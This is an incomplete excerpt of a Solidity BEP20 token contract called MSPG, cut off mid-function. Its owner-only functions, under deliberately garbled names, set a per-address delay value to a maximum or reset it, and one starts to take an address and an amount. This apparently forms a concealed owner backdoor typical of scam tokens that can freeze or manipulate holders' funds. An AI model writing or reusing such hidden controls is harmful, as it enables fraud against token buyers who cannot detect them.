...
contract MSPG is IBEP20, HasForeignAsset {
    ...
    function getMySharpeiGotchi26120ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setMySharpeiGotchi26120reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupMySharpeiGotchi26120ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupMySharpeiGotchi26120Aasses(address booadndd,uint256 nuum) public onlyOwner {
